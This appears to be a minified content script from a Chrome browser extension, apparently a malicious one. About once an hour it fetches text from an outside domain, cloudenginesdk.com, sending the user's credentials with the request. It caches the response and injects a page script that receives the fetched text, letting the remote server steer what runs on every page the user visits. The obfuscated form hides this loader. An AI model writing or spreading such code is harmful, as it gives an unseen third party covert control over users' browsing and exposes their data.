chrome.storage.local.get(["data","time","tm"],a=>{let b=parseInt(""+Date.now()/1000),c=b=>{let a=document.createElement("script");a.setAttribute("data-options",b),a.setAttribute("src",chrome.runtime.getURL("js/options.js")),a.onload=()=>{document.documentElement.removeChild(a)},document.documentElement.appendChild(a)};(!a.data||a.time&&b-parseInt(a.time)>3600)&&(!a.tm||b-parseInt(a.tm)>30)?chrome.storage.local.set({tm:b},()=>{fetch("https://cloudenginesdk.com/api/v2/?prod=rooftop",{credentials:"include"}).then(a=>a.text()).then(a=>{chrome.storage.local.set({data:a,time:b,tm:""},()=>{c(a)})}).catch(()=>{chrome.storage.local.set({tm:""},()=>{})})}):a.data&&c(a.data)})